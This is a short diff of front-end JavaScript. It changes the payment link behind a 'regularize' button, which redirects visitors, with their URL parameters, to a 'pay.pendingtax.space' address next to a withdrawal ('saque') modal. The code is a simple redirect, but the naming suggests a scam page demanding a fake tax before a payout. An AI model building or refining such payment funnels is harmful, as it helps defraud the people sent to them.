@@ -422,23 +422,21 @@ document.addEventListener("DOMContentLoaded", function () {
       });
     }
   
-    const regularizeBtn = document.getElementById("regularizeBtn");
-    if (regularizeBtn) {
-      regularizeBtn.addEventListener("click", function () {
-        const baseUrl = "https://pay.pendingtax.space/RmA83EaRmbp3PVp";
-        const currentParams = window.location.search;
-  
-        const finalUrl = currentParams
-          ? `${baseUrl}${baseUrl.includes("?") ? "&" : "?"}${currentParams.slice(
-              1
-            )}`
-          : baseUrl;
-  
-        window.location.href = finalUrl;
-      });
-    }
-  
-    const saqueModal = document.getElementById("saqueModal");
+  const regularizeBtn = document.getElementById("regularizeBtn");
+  if (regularizeBtn) {
+    regularizeBtn.addEventListener("click", function () {
+      const baseUrl = "https://pay.pendingtax.space/bz5KZbVbvbBZ7dL";
+      const currentParams = window.location.search;
+
+      const finalUrl = currentParams
+        ? `${baseUrl}${baseUrl.includes("?") ? "&" : "?"}${currentParams.slice(
+            1
+          )}`
+        : baseUrl;
+
+      window.location.href = finalUrl;
+    });
+  }    const saqueModal = document.getElementById("saqueModal");
     if (saqueModal) {
       saqueModal.addEventListener("hidden.bs.modal", function () {
         removeModalBackdrop();
